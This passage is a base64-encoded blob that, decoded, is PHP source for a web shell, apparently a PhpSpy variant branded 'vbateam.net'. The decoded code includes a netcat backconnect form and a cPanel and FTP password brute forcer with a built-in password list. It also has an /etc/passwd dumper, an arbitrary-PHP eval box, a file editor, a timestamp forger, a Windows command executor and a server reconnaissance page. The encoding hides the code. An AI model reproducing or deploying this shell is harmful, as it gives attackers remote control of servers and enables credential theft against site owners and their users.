hhcnJheSgnbmFtZSc9Pid5b3VycG9ydCcsJ3NpemUnPT4xNSwndmFsdWUnPT4keW91cnBvcnQpKTsKCXAoJ1VzZTonKTsKCW1ha2VzZWxlY3QoYXJyYXkoJ25hbWUnPT4ndXNlJywnb3B0aW9uJz0+JHVzZWRiLCdzZWxlY3RlZCc9PiR1c2UpKTsKCW1ha2VpbnB1dChhcnJheSgnbmFtZSc9PidzdGFydCcsJ3ZhbHVlJz0+J1N0YXJ0JywndHlwZSc9PidzdWJtaXQnLCdjbGFzcyc9PididCcpKTsKCXAoJzwvcD4nKTsKCWZvcm1mb290KCk7Cn0vL2VuZCBiYWNrY29ubmVjdCB3aW5kb3cgdmlhIE5DCgovLyBCcnV0ZQplbHNlaWYgKCRhY3Rpb24gPT0gJ2JydXRlJykgewpmb3JtaGVhZChhcnJheSgndGl0bGUnPT4nQnJ1dGUgRm9yY2VyJykpOwoJbWFrZWhpZGUoJ2FjdGlvbicsJ2JydXRlJyk7CgltYWtlaGlkZSgnZGlyJywkYnJ1dGUpOwpAaW5pX3NldCgnbWVtb3J5X2xpbWl0JywgMTAwMDAwMDAwMDAwMCk7CiRjb25uZWN0X3RpbWVvdXQ9NTsKQHNldF90aW1lX2xpbWl0KDApOwokc3VibWl0ID0gJF9SRVFVRVNUWydzdWJtaXQnXTsKJHVzZXJzID0gJF9SRVFVRVNUWyd1c2VycyddOwokcGFzcyA9ICRfUkVRVUVTVFsncGFzc3dvcmRzJ107CiR0YXJnZXQgPSAkX1JFUVVFU1RbJ3RhcmdldCddOwokb3B0aW9uID0gJF9SRVFVRVNUWydvcHRpb24nXTsKCgokcGFzc2xpc3QgPSAiMDEyMzQ1NgowMTIzNDU2NwowMTIzNDU2NzgKMDEyMzQ1Njc4OQowMTIzNDU2Nzg5MAoxMjM0NTYKMTIzNDU2NwoxMjM0NTY3OAoxMjM0NTY3ODkKMTIzNDU2Nzg5MAoxMTExMTEKMDAwMDAwCjIyMjIyMgozMzMzMzMKNDQ0NDQ0CjU1NTU1NQo2NjY2NjYKNzc3Nzc3Cjg4ODg4OAo5OTk5OTkKMTIzMTIzCjQ1NjQ1Ngo3ODk3ODkKMTIzMzIxCjQ1NjY1NAo2NTQzMjEKNzY1NDMyMQo4NzY1NDMyMQo5ODc2NTQzMjEKMDk4NzY1NDMyMQphZG1pbgphZG1pbmlzdHJhdG9yCmFkbWluY3AKY3BhbmVsCmFkbWlueAphZG1pbnMKcGFzc3dvcmQKcGFzc3dvcmRzCnBhc3N3MHJkCnBAc3N3MHJkCnBAc3N3b3JkCmtob25nY28KMjUyNTEzMjUKcGFzc3cwcmRzIjsKaWYoJHRhcmdldCA9PSAnJyl7CiR0YXJnZXQgPSAnbG9jYWxob3N0JzsKfQpwcmludCAiIDxkaXYgYWxpZ249J2NlbnRlcic+Cjxmb3JtIG1ldGhvZD0ncG9zdCcgc3R5bGU9J2JvcmRlcjogMXB4IHNvbGlkICMwMDAwMDAnPjxicj48YnI+CjxUQUJMRSBzdHlsZT0nQk9SREVSLUNPTExBUFNFOiBjb2xsYXBzZScgY2VsbFNwYWNpbmc9MCBib3JkZXJDb2xvckRhcms9Izk2NjExNyBjZWxsUGFkZGluZz01IHdpZHRoPSc0MCUnIGJnQ29sb3I9IzMwMzAzMCBib3JkZXJDb2xvckxpZ2h0PSM5NjYxMTcgYm9yZGVyPTE+PHRyPjx0ZD4KPGI+IFRhcmdldCAgOiA8L2ZvbnQ+PGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J3RhcmdldCcgc2l6ZT0nMTYnIHZhbHVlPSAkdGFyZ2V0IHN0eWxlPSdib3JkZXI6IGZvbnQtZmFtaWx5OnRhaG9tYTsgZm9udC13ZWlnaHQ6Ym9sZDsnPjwvcD48L2ZvbnQ+PC9iPjwvcD4KPGRpdiBhbGlnbj0nY2VudGVyJz48YnI+CjxUQUJMRSBzdHlsZT0nQk9SREVSLUNPTExBUFNFOiBjb2xsYXBzZScgY2VsbFNwYWNpbmc9MCBib3JkZXJDb2xvckRhcms9Izk2NjExNyBjZWxsUGFkZGluZz01IHdpZHRoPSc1MCUnIGJnQ29sb3I9IzMwMzAzMCBib3JkZXJDb2xvckxpZ2h0PSM5NjYxMTcgYm9yZGVyPTE+Cjx0cj4KPHRkIGFsaWduPSdjZW50ZXInPgo8Yj5Vc2VybmFtZTwvYj48L3RkPgo8dGQ+CjxwIGFsaWduPSdjZW50ZXInPgo8Yj5QYXNzd29yZDwvYj48L3RkPgo8L3RyPgo8L3RhYmxlPgo8cCBhbGlnbj0nY2VudGVyJz4KPHRleHRhcmVhIHJvd3M9JzIwJyBuYW1lPSd1c2VycycgY29scz0nMjUnIHN0eWxlPSdib3JkZXI6IDJweCBzb2xpZCAjMUQxRDFEOyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwOyBjb2xvcjojQzBDMEMwJz4iOwokaSA9IDA7CndoaWxlICgkaSA8IDYwMDAwKSB7CgogICAgJGxpbmUgPSBwb3NpeF9nZXRwd3VpZCgkaSk7CiAgICBpZiAoIWVtcHR5KCRsaW5lKSkgewoKICAgICAgICB3aGlsZSAobGlzdCAoJGtleSwgJHZiYV9ldGNwd2QpID0gZWFjaCgkbGluZSkpewogICAgICAgICAgICBlY2hvICIiLiR2YmFfZXRjcHdkLiJcbiI7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KCiAgICB9CgogICAkaSsrOwp9CmVjaG8gIgo8L3RleHRhcmVhPgo8dGV4dGFyZWEgcm93cz0nMjAnIG5hbWU9J3Bhc3N3b3JkcycgY29scz0nMjUnIHN0eWxlPSdib3JkZXI6IDJweCBzb2xpZCAjMUQxRDFEOyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwOyBjb2xvcjojQzBDMEMwJz4kcGFzc2xpc3Q8L3RleHRhcmVhPjxicj4KPGJyPgo8Yj5PcHRpb25zIDogPC9zcGFuPjxpbnB1dCBuYW1lPSdvcHRpb24nIHZhbHVlPSdjcGFuZWwnIHN0eWxlPSdmb250LXdlaWdodDogNzAwOycgY2hlY2tlZCB0eXBlPSdyYWRpbyc+IGNQYW5lbAo8aW5wdXQgbmFtZT0nb3B0aW9uJyB2YWx1ZT0nZnRwJyBzdHlsZT0nZm9udC13ZWlnaHQ6IDcwMDsnIHR5cGU9J3JhZGlvJz4gZnRwID09PiA8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nQXR0YWNrJyBuYW1lPSdzdWJtaXQnID48L3A+CjwvdGQ+PC90cj48L3RhYmxlPjwvdGQ+PC90cj48L2Zvcm0+PHAgYWxpZ249ICdsZWZ0Jz4iOwo/Pgo8P3BocApmdW5jdGlvbiBmdHBfY2hlY2soJGhvc3QsJHVzZXIsJHBhc3MsJHRpbWVvdXQpewokY2ggPSBjdXJsX2luaXQoKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgImZ0cDovLyRob3N0Iik7CmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7CmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9IVFRQQVVUSCwgQ1VSTEFVVEhfQkFTSUMpOwpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRlRQTElTVE9OTFksIDEpOwpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUlBXRCwgIiR1c2VyOiRwYXNzIik7CmN1cmxfc2V0b3B0ICgkY2gsIENVUkxPUFRfQ09OTkVDVFRJTUVPVVQsICR0aW1lb3V0KTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZBSUxPTkVSUk9SLCAxKTsKJGRhdGEgPSBjdXJsX2V4ZWMoJGNoKTsKaWYgKCBjdXJsX2Vycm5vKCRjaCkgPT0gMjggKSB7CgpwcmludCAiPGI+IEVycm9yIDogQ29ubmVjdGlvbiB0aW1lZCBvdXQgLCBtYWtlIGNvbmZpZGVuY2UgYWJvdXQgdmFsaWRhdGlvbiBvZiB0YXJnZXQgITwvYj4iOwpleGl0O30KCmVsc2VpZiAoIGN1cmxfZXJybm8oJGNoKSA9PSAwICl7CgpwKCI8Yj5bIGF0dGFja0B2YmF0ZWFtLm5ldCBdIyA8L2I+CjxiPiBBdHRhY2tpbmcgaGFzIGJlZW4gZG9uZSEgVXNlcm5hbWU6IDxmb250IGNvbG9yPScjRkYwMDAwJz4gJHVzZXIgPC9mb250PiAvIFBhc3N3b3JkOjxmb250IGNvbG9yPScjRkYwMDAwJz4gJHBhc3MgPC9mb250PiA9PiA8YSBocmVmPWh0dHA6Ly8kdXNlcjokcGFzc0AkaG9zdDoyMDgyIHRhcmdldD1fYmxhbms+TG9naW48L2E+PC9iPjxicj4iKTsKfQpjdXJsX2Nsb3NlKCRjaCk7fQoKZnVuY3Rpb24gY3BhbmVsX2NoZWNrKCRob3N0LCR1c2VyLCRwYXNzLCR0aW1lb3V0KXsKJGNoID0gY3VybF9pbml0KCk7CmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICJodHRwOi8vJGhvc3Q6MjA4MiIpOwpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOwpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSFRUUEFVVEgsIENVUkxBVVRIX0JBU0lDKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VTRVJQV0QsICIkdXNlcjokcGFzcyIpOwpjdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX0NPTk5FQ1RUSU1FT1VULCAkdGltZW91dCk7CmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GQUlMT05FUlJPUiwgMSk7CiRkYXRhID0gY3VybF9leGVjKCRjaCk7CmlmICggY3VybF9lcnJubygkY2gpID09IDI4ICkgewpwcmludCAiPGI+IEVycm9yIDogQ29ubmVjdGlvbiB0aW1lZCBvdXQgLCBtYWtlIGNvbmZpZGVuY2UgYWJvdXQgdmFsaWRhdGlvbiBvZiB0YXJnZXQgITwvYj4iOwpleGl0O30KZWxzZWlmICggY3VybF9lcnJubygkY2gpID09IDAgKXsKCnAoIjxiPlsgYXR0YWNrQHZiYXRlYW0ubmV0IF0jIDwvYj48Yj5BdHRhY2tpbmcgaGFzIGJlZW4gZG9uZSE8L2E+IFVzZXJuYW1lOiA8Zm9udCBjb2xvcj0nI0ZGMDAwMCc+ICR1c2VyIDwvZm9udD4gLyBQYXNzd29yZDo8Zm9udCBjb2xvcj0nI0ZGMDAwMCc+ICRwYXNzIDwvZm9udD48L2I+PGJyPiIpO31jdXJsX2Nsb3NlKCRjaCk7fQoKaWYoaXNzZXQoJHN1Ym1pdCkgJiYgIWVtcHR5KCRzdWJtaXQpKXsKCiR1c2VybGlzdCA9IGV4cGxvZGUgKCJcbiIgLCAkdXNlcnMgKTsKJHBhc3NsaXN0ID0gZXhwbG9kZSAoIlxuIiAsICRwYXNzICk7CnAoJzxiPlsgYXR0YWNrQHZiYXRlYW0ubmV0IF0jIEF0dGFja2luZyAuLi48L2ZvbnQ+PC9iPjxicj4nKTsKZm9yZWFjaCAoJHVzZXJsaXN0IGFzICR1c2VyKSB7CiRfdXNlciA9IHRyaW0oJHVzZXIpOwpmb3JlYWNoICgkcGFzc2xpc3QgYXMgJHBhc3N3b3JkICkgewokX3Bhc3MgPSB0cmltKCRwYXNzd29yZCk7CmlmKCRvcHRpb24gPT0gImZ0cCIpewpmdHBfY2hlY2soJHRhcmdldCwkX3VzZXIsJF9wYXNzLCRjb25uZWN0X3RpbWVvdXQpOwp9CmlmICgkb3B0aW9uID09ICJjcGFuZWwiKQp7CmNwYW5lbF9jaGVjaygkdGFyZ2V0LCRfdXNlciwkX3Bhc3MsJGNvbm5lY3RfdGltZW91dCk7Cn0KfQp9Cn0KCglmb3JtZm9vdCgpOwp9CgoKCgoKCmVsc2VpZiAoJGFjdGlvbiA9PSAnZXRjcHdkJykgewpmb3JtaGVhZChhcnJheSgndGl0bGUnPT4nR2V0IC9ldGMvcGFzc3dkJykpOwoJbWFrZWhpZGUoJ2FjdGlvbicsJ2V0Y3B3ZCcpOwoJbWFrZWhpZGUoJ2RpcicsJG5vd3BhdGgpOwokaSA9IDA7CiBlY2hvICI8cD48YnI+PHRleHRhcmVhIGNsYXNzPVwiYXJlYVwiIGlkPVwicGhwY29kZXh4eFwiIG5hbWU9XCJwaHBjb2RleHh4XCIgY29scz1cIjEwMFwiIHJvd3M9XCIyNVwiPiI7CndoaWxlICgkaSA8IDYwMDAwKSB7CgogICAgJGxpbmUgPSBwb3NpeF9nZXRwd3VpZCgkaSk7CiAgICBpZiAoIWVtcHR5KCRsaW5lKSkgewoKICAgICAgICB3aGlsZSAobGlzdCAoJGtleSwgJHZiYV9ldGNwd2QpID0gZWFjaCgkbGluZSkpewogICAgICAgICAgICBlY2hvICIiLiR2YmFfZXRjcHdkLiJcbiI7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KCiAgICB9CgogICAkaSsrOwp9CiAgZWNobyAiPC90ZXh0YXJlYT48L3A+IjsKCWZvcm1mb290KCk7Cn0KCmVsc2VpZiAoJGFjdGlvbiA9PSAnZXZhbCcpIHsKCSRwaHBjb2RlID0gdHJpbSgkcGhwY29kZSk7CglpZigkcGhwY29kZSl7CgkJaWYgKCFwcmVnX21hdGNoKCcjPFw/I3NpJywgJHBocGNvZGUpKSB7CgkJCSRwaHBjb2RlID0gIjw/cGhwXG5cbnskcGhwY29kZX1cblxuPz4iOwoJCX0KCQlldmFsKCI/Ii4iPiRwaHBjb2RlPD8iKTsKCX0KCWZvcm1oZWFkKGFycmF5KCd0aXRsZSc9PidFdmFsIFBIUCBDb2RlJykpOwoJbWFrZWhpZGUoJ2FjdGlvbicsJ2V2YWwnKTsKCW1ha2V0ZXh0KGFycmF5KCd0aXRsZSc9PidQSFAgQ29kZScsJ25hbWUnPT4ncGhwY29kZScsICd2YWx1ZSc9PiRwaHBjb2RlKSk7CglwKCc8cD48YSBocmVmPSJodHRwOi8vd3d3LjRuZ2VsLm5ldC9waHBzcHkvcGx1Z2luLyIgdGFyZ2V0PSJfYmxhbmsiPkdldCBwbHVnaW5zPC9hPjwvcD4nKTsKCWZvcm1mb290ZXIoKTsKfS8vZW5kIGV2YWwKCmVsc2VpZiAoJGFjdGlvbiA9PSAnZWRpdGZpbGUnKSB7CglpZihmaWxlX2V4aXN0cygkb3BmaWxlKSkgewoJCSRmcD1AZm9wZW4oJG9wZmlsZSwncicpOwoJCSRjb250ZW50cz1AZnJlYWQoJGZwLCBmaWxlc2l6ZSgkb3BmaWxlKSk7CgkJQGZjbG9zZSgkZnApOwoJCSRjb250ZW50cz1odG1sc3BlY2lhbGNoYXJzKCRjb250ZW50cyk7Cgl9Cglmb3JtaGVhZChhcnJheSgndGl0bGUnPT4nQ3JlYXRlIC8gRWRpdCBGaWxlJykpOwoJbWFrZWhpZGUoJ2FjdGlvbicsJ2ZpbGUnKTsKCW1ha2VoaWRlKCdkaXInLCRub3dwYXRoKTsKCW1ha2VpbnB1dChhcnJheSgndGl0bGUnPT4nQ3VycmVudCBGaWxlIChpbXBvcnQgbmV3IGZpbGUgbmFtZSBhbmQgbmV3IGZpbGUpJywnbmFtZSc9PidlZGl0ZmlsZW5hbWUnLCd2YWx1ZSc9PiRvcGZpbGUsJ25ld2xpbmUnPT4xKSk7CgltYWtldGV4dChhcnJheSgndGl0bGUnPT4nRmlsZSBDb250ZW50JywnbmFtZSc9PidmaWxlY29udGVudCcsJ3ZhbHVlJz0+JGNvbnRlbnRzKSk7Cglmb3JtZm9vdGVyKCk7Cn0vL2VuZCBlZGl0ZmlsZQoKZWxzZWlmICgkYWN0aW9uID09ICduZXd0aW1lJykgewoJJG9wZmlsZW10aW1lID0gQGZpbGVtdGltZSgkb3BmaWxlKTsKCS8vJHRpbWUgPSBzdHJ0b3RpbWUoIiR5ZWFyLSRtb250aC0kZGF5ICRob3VyOiRtaW51dGU6JHNlY29uZCIpOwoJJGNhY2hlbW9udGggPSBhcnJheSgnSmFudWFyeSc9PjEsJ0ZlYnJ1YXJ5Jz0+MiwnTWFyY2gnPT4zLCdBcHJpbCc9PjQsJ01heSc9PjUsJ0p1bmUnPT42LCdKdWx5Jz0+NywnQXVndXN0Jz0+OCwnU2VwdGVtYmVyJz0+OSwnT2N0b2Jlcic9PjEwLCdOb3ZlbWJlcic9PjExLCdEZWNlbWJlcic9PjEyKTsKCWZvcm1oZWFkKGFycmF5KCd0aXRsZSc9PidDbG9uZSBmaWxlIHdhcyBsYXN0IG1vZGlmaWVkIHRpbWUnKSk7CgltYWtlaGlkZSgnYWN0aW9uJywnZmlsZScpOwoJbWFrZWhpZGUoJ2RpcicsJG5vd3BhdGgpOwoJbWFrZWlucHV0KGFycmF5KCd0aXRsZSc9PidBbHRlciBmaWxlJywnbmFtZSc9PidjdXJmaWxlJywndmFsdWUnPT4kb3BmaWxlLCdzaXplJz0+MTIwLCduZXdsaW5lJz0+MSkpOwoJbWFrZWlucHV0KGFycmF5KCd0aXRsZSc9PidSZWZlcmVuY2UgZmlsZSAoZnVsbHBhdGgpJywnbmFtZSc9Pid0YXJmaWxlJywnc2l6ZSc9PjEyMCwnbmV3bGluZSc9PjEpKTsKCWZvcm1mb290ZXIoKTsKCWZvcm1oZWFkKGFycmF5KCd0aXRsZSc9PidTZXQgbGFzdCBtb2RpZmllZCcpKTsKCW1ha2VoaWRlKCdhY3Rpb24nLCdmaWxlJyk7CgltYWtlaGlkZSgnZGlyJywkbm93cGF0aCk7CgltYWtlaW5wdXQoYXJyYXkoJ3RpdGxlJz0+J0N1cnJlbnQgZmlsZSAoZnVsbHBhdGgpJywnbmFtZSc9PidjdXJmaWxlJywndmFsdWUnPT4kb3BmaWxlLCdzaXplJz0+MTIwLCduZXdsaW5lJz0+MSkpOwoJcCgnPHA+SW5zdGVhZCAmcmFxdW87Jyk7CglwKCd5ZWFyOicpOwoJbWFrZWlucHV0KGFycmF5KCduYW1lJz0+J3llYXInLCd2YWx1ZSc9PmRhdGUoJ1knLCRvcGZpbGVtdGltZSksJ3NpemUnPT40KSk7CglwKCdtb250aDonKTsKCW1ha2VpbnB1dChhcnJheSgnbmFtZSc9Pidtb250aCcsJ3ZhbHVlJz0+ZGF0ZSgnbScsJG9wZmlsZW10aW1lKSwnc2l6ZSc9PjIpKTsKCXAoJ2RheTonKTsKCW1ha2VpbnB1dChhcnJheSgnbmFtZSc9PidkYXknLCd2YWx1ZSc9PmRhdGUoJ2QnLCRvcGZpbGVtdGltZSksJ3NpemUnPT4yKSk7CglwKCdob3VyOicpOwoJbWFrZWlucHV0KGFycmF5KCduYW1lJz0+J2hvdXInLCd2YWx1ZSc9PmRhdGUoJ0gnLCRvcGZpbGVtdGltZSksJ3NpemUnPT4yKSk7CglwKCdtaW51dGU6Jyk7CgltYWtlaW5wdXQoYXJyYXkoJ25hbWUnPT4nbWludXRlJywndmFsdWUnPT5kYXRlKCdpJywkb3BmaWxlbXRpbWUpLCdzaXplJz0+MikpOwoJcCgnc2Vjb25kOicpOwoJbWFrZWlucHV0KGFycmF5KCduYW1lJz0+J3NlY29uZCcsJ3ZhbHVlJz0+ZGF0ZSgncycsJG9wZmlsZW10aW1lKSwnc2l6ZSc9PjIpKTsKCXAoJzwvcD4nKTsKCWZvcm1mb290ZXIoKTsKfS8vZW5kIG5ld3RpbWUKCmVsc2VpZiAoJGFjdGlvbiA9PSAnc2hlbGwnKSB7CglpZiAoSVNfV0lOICYmIElTX0NPTSkgewoJCWlmKCRwcm9ncmFtICYmICRwYXJhbWV0ZXIpIHsKCQkJJHNoZWxsPSBuZXcgQ09NKCdTaGVsbC5BcHBsaWNhdGlvbicpOwoJCQkkYSA9ICRzaGVsbC0+U2hlbGxFeGVjdXRlKCRwcm9ncmFtLCRwYXJhbWV0ZXIpOwoJCQltKCdQcm9ncmFtIHJ1biBoYXMgJy4oISRhID8gJ3N1Y2Nlc3MnIDogJ2ZhaWwnKSk7CgkJfQoJCSEkcHJvZ3JhbSAmJiAkcHJvZ3JhbSA9ICdjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUnOwoJCSEkcGFyYW1ldGVyICYmICRwYXJhbWV0ZXIgPSAnL2MgbmV0IHN0YXJ0ID4gJy5TQV9ST09ULidsb2cudHh0JzsKCQlmb3JtaGVhZChhcnJheSgndGl0bGUnPT4nRXhlY3V0ZSBQcm9ncmFtJykpOwoJCW1ha2VoaWRlKCdhY3Rpb24nLCdzaGVsbCcpOwoJCW1ha2VpbnB1dChhcnJheSgndGl0bGUnPT4nUHJvZ3JhbScsJ25hbWUnPT4ncHJvZ3JhbScsJ3ZhbHVlJz0+JHByb2dyYW0sJ25ld2xpbmUnPT4xKSk7CgkJcCgnPHA+Jyk7CgkJbWFrZWlucHV0KGFycmF5KCd0aXRsZSc9PidQYXJhbWV0ZXInLCduYW1lJz0+J3BhcmFtZXRlcicsJ3ZhbHVlJz0+JHBhcmFtZXRlcikpOwoJCW1ha2VpbnB1dChhcnJheSgnbmFtZSc9PidzdWJtaXQnLCdjbGFzcyc9PididCcsJ3R5cGUnPT4nc3VibWl0JywndmFsdWUnPT4nRXhlY3V0ZScpKTsKCQlwKCc8L3A+Jyk7CgkJZm9ybWZvb3QoKTsKCX0KCWZvcm1oZWFkKGFycmF5KCd0aXRsZSc9PidFeGVjdXRlIENvbW1hbmQnKSk7CgltYWtlaGlkZSgnYWN0aW9uJywnc2hlbGwnKTsKCWlmIChJU19XSU4gJiYgSVNfQ09NKSB7CgkJJGV4ZWNmdW5jZGIgPSBhcnJheSgncGhwZnVuYyc9PidwaHBmdW5jJywnd3NjcmlwdCc9Pid3c2NyaXB0JywncHJvY19vcGVuJz0+J3Byb2Nfb3BlbicpOwoJCW1ha2VzZWxlY3QoYXJyYXkoJ3RpdGxlJz0+J1VzZTonLCduYW1lJz0+J2V4ZWNmdW5jJywnb3B0aW9uJz0+JGV4ZWNmdW5jZGIsJ3NlbGVjdGVkJz0+JGV4ZWNmdW5jLCduZXdsaW5lJz0+MSkpOwoJfQoJcCgnPHA+Jyk7CgltYWtlaW5wdXQoYXJyYXkoJ3RpdGxlJz0+J0NvbW1hbmQnLCduYW1lJz0+J2NvbW1hbmQnLCd2YWx1ZSc9PiRjb21tYW5kKSk7CgltYWtlaW5wdXQoYXJyYXkoJ25hbWUnPT4nc3VibWl0JywnY2xhc3MnPT4nYnQnLCd0eXBlJz0+J3N1Ym1pdCcsJ3ZhbHVlJz0+J0V4ZWN1dGUnKSk7CglwKCc8L3A+Jyk7Cglmb3JtZm9vdCgpOwoKCWlmICgkY29tbWFuZCkgewoJCXAoJzxociB3aWR0aD0iMTAwJSIgbm9zaGFkZSAvPjxwcmU+Jyk7CgkJaWYgKCRleGVjZnVuYz09J3dzY3JpcHQnICYmIElTX1dJTiAmJiBJU19DT00pIHsKCQkJJHdzaCA9IG5ldyBDT00oJ1dTY3JpcHQuc2hlbGwnKTsKCQkJJGV4ZWMgPSAkd3NoLT5leGVjKCdjbWQuZXhlIC9jICcuJGNvbW1hbmQpOwoJCQkkc3Rkb3V0ID0gJGV4ZWMtPlN0ZE91dCgpOwoJCQkkc3Ryb3V0cHV0ID0gJHN0ZG91dC0+UmVhZEFsbCgpOwoJCQllY2hvICRzdHJvdXRwdXQ7CgkJfSBlbHNlaWYgKCRleGVjZnVuYz09J3Byb2Nfb3BlbicgJiYgSVNfV0lOICYmIElTX0NPTSkgewoJCQkkZGVzY3JpcHRvcnNwZWMgPSBhcnJheSgKCQkJICAgMCA9PiBhcnJheSgncGlwZScsICdyJyksCgkJCSAgIDEgPT4gYXJyYXkoJ3BpcGUnLCAndycpLAoJCQkgICAyID0+IGFycmF5KCdwaXBlJywgJ3cnKQoJCQkpOwoJCQkkcHJvY2VzcyA9IHByb2Nfb3BlbigkX1NFUlZFUlsnQ09NU1BFQyddLCAkZGVzY3JpcHRvcnNwZWMsICRwaXBlcyk7CgkJCWlmIChpc19yZXNvdXJjZSgkcHJvY2VzcykpIHsKCQkJCWZ3cml0ZSgkcGlwZXNbMF0sICRjb21tYW5kLiJcclxuIik7CgkJCQlmd3JpdGUoJHBpcGVzWzBdLCAiZXhpdFxyXG4iKTsKCQkJCWZjbG9zZSgkcGlwZXNbMF0pOwoJCQkJd2hpbGUgKCFmZW9mKCRwaXBlc1sxXSkpIHsKCQkJCQllY2hvIGZnZXRzKCRwaXBlc1sxXSwgMTAyNCk7CgkJCQl9CgkJCQlmY2xvc2UoJHBpcGVzWzFdKTsKCQkJCXdoaWxlICghZmVvZigkcGlwZXNbMl0pKSB7CgkJCQkJZWNobyBmZ2V0cygkcGlwZXNbMl0sIDEwMjQpOwoJCQkJfQoJCQkJZmNsb3NlKCRwaXBlc1syXSk7CgkJCQlwcm9jX2Nsb3NlKCRwcm9jZXNzKTsKCQkJfQoJCX0gZWxzZSB7CgkJCWVjaG8oZXhlY3V0ZSgkY29tbWFuZCkpOwoJCX0KCQlwKCc8L3ByZT4nKTsKCX0KfS8vZW5kIHNoZWxsCgplbHNlaWYgKCRhY3Rpb24gPT0gJ3BocGVudicpIHsKCSR1cHNpemU9Z2V0Y2ZnKCdmaWxlX3VwbG9hZHMnKSA/IGdldGNmZygndXBsb2FkX21heF9maWxlc2l6ZScpIDogJ05vdCBhbGxvd2VkJzsKCSRhZG1pbm1haWw9aXNzZXQoJF9TRVJWRVJbJ1NFUlZFUl9BRE1JTiddKSA/ICRfU0VSVkVSWydTRVJWRVJfQURNSU4nXSA6IGdldGNmZygnc2VuZG1haWxfZnJvbScpOwoJISRkaXNfZnVuYyAmJiAkZGlzX2Z1bmMgPSAnTm8nOwoJJGluZm8gPSBhcnJheSgKCQkxID0+IGFycmF5KCdTZXJ2ZXIgVGltZScsZGF0ZSgnWS9tL2QgaDppOnMnLCR0aW1lc3RhbXApKSwKCQkyID0+IGFycmF5KCdTZXJ2ZXIgRG9tYWluJywkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSksCgkJMyA9PiBhcnJheSgnU2VydmVyIElQJyxnZXRob3N0YnluYW1lKCRfU0VSVkVSWydTRVJWRVJfTkFNRSddKSksCgkJNCA9PiBhcnJheSgnU2VydmVyIE9TJyxQSFBfT1MpLAoJCTUgPT4gYXJyYXkoJ1NlcnZlciBPUyBDaGFyc2V0JywkX1NFUlZFUlsnSFRUUF9BQ0NFUFRfTEFOR1VBR0UnXSksCgkJNiA9PiBhcnJheSgnU2VydmVyIFNvZnR3YXJlJywkX1NFUlZFUlsnU0VSVkVSX1NPRlRXQVJFJ10pLAoJCTcgPT4gYXJyYXkoJ1NlcnZlciBXZWIgUG9ydCcsJF9TRVJWRVJbJ1NFUlZFUl9QT1JUJ10pLAoJCTggPT4gYXJyYXkoJ1BIUCBydW4gbW9kZScsc3RydG91cHBlcihwaHBfc2FwaV9uYW1lKCkpKSwKCQk5ID0+IGFycmF5KCdUaGUgZmlsZSBwYXRoJyxfX0ZJTEVfXyksCgoJCTEwID0+IGFycmF5KCdQSFAgVmVyc2lvbicsUEhQX1ZFUlNJT04pLAoJCTExID0+IGFycmF5KCdQSFBJTkZPJywoSVNfUEhQSU5GTyA/ICc8YSBocmVmPSJqYXZhc2NyaXB0OmdvYWN0aW9uKFwncGhwaW5mb1wnKTsiPlllczwvYT4nIDogJ05vJykpLAoJCTEyID0+IGFycmF5KCdTYWZlIE1vZGUnLGdldGNmZygnc2FmZV9tb2RlJykpLAoJCTEzID0+IGFycmF5KCdBZG1pbmlzdHJhdG9yJywkYWRtaW5tYWlsKSwKCQkxNCA9PiBhcnJheSgnYWxsb3dfdXJsX2ZvcGVuJyxnZXRjZmcoJ2FsbG93X3VybF9mb3BlbicpKSwKCQkxNSA9PiBhcnJheSgnZW5hYmxlX2RsJyxnZXRjZmcoJ2VuYWJsZV9kbCcpKSwKCQkxNiA9PiBhcnJheSgnZGlzcGxheV9lcnJvcnMnLGdldGNmZygnZGlzcGxheV9lcnJvcnMnKSksCgkJMTcgPT4gYXJyYXkoJ3JlZ2lzdGVyX2dsb2JhbHMnLGdldGNmZygncmVnaXN0ZXJfZ2xvYmFscycpKSwKCQkxOCA9PiBhcnJheSgnbWFnaWNfcXVvdGVzX2dwYycsZ2V0Y2ZnKCdtYWdpY19xdW90ZXNfZ3BjJykpLAoJCTE5ID0+IGFycmF5KCdtZW1vcnlfbGltaXQnLGdldGNmZygnbWVtb3J5X2xpbWl0JykpLAoJCTIwID0+IGFycmF5KCdwb3N0X21heF9zaXplJyxnZXRjZmcoJ3Bvc3RfbWF4X3NpemUnKSksCgkJMjEgPT4gYXJyYXkoJ3VwbG9hZF9tYXhfZmlsZXNpemUnLCR1cHNpemUpLAoJCTIyID0+IGFycmF5KCdtYXhfZXhlY3V0aW9uX3RpbWUnLGdldGNmZygnbWF4X2V4ZWN1dGlvbl90aW1lJykuJyBzZWNvbmQocyknKSwKCQkyMyA9PiBhcnJheSgnZGlzYWJsZV9mdW5jdGlvbnMnLCRkaXNfZnVuYyksCgkpOwoKCWlmKCRwaHB2YXJuYW1lKSB7CgkJbSgkcGhwdmFybmFtZSAuJyA6ICcuZ2V0Y2ZnKCRwaHB2YXJuYW1lKSk7Cgl9CgoJZm9ybWhlYWQoYXJyYXkoJ3RpdGxlJz0+J1NlcnZlciBlbnZpcm9ubWVudCcpKTsKCW1ha2VoaWRlKCdhY3Rpb24nLCdwaHBlbnYnKTsKCW1ha2VpbnB1dChhcnJheSgndGl0bGUnPT4nUGxlYXNlIGlucHV0IFBIUCBjb25maWd1cmF0aW9uIHBhcmFtZXRlcihlZzptYWdpY19xd